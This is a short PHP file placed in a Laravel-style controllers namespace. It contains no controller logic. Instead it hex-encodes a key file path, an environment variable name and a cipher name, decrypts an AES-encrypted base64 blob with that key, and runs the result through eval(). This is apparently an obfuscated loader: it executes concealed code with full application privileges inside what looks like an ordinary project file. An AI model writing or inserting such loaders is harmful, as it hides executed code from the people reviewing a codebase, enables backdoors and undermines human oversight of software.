<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Eo6MK/fAQ0oCyr37TFblrA==');

$c=base64_decode(

'jpbOCuIeMg9dmEkmijCOZStWyzgCaYE/F8Lh9NeORNksa2yP5tnugSXRQ/GCHU0xlJPKi4/XWjoV' .
'v5Vw2wuITsIJXANyV4pPxy/23HTt4FmYDjThdiIziU8nEU78qJcrEMEfrpm/8epIKlPJLgaYdpIC' .
'xauql+990t+Ej0qdI9AtJhHIrlstc+cdaIGFga5GlUndDtb4otoILDxPgqAQI2AfXHIx/WCE8+Ns' .
'6jzFBfLnzpap0s38pKZaZHGRdI3GdBSJrHuxNmXl3x1UsYl0apEkmJsyNVUFeMRPsZhAxJnG5Knh' .
'4rA99UtqjSy9Ga0YxFAOVflNjWrrmq7qi4AL420dR/GskHxfODSldzICU2DW8M4Qs2jjz3+bEFFS' .
'PjHiFPobzqXuwTCEfy6e2eZQPA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

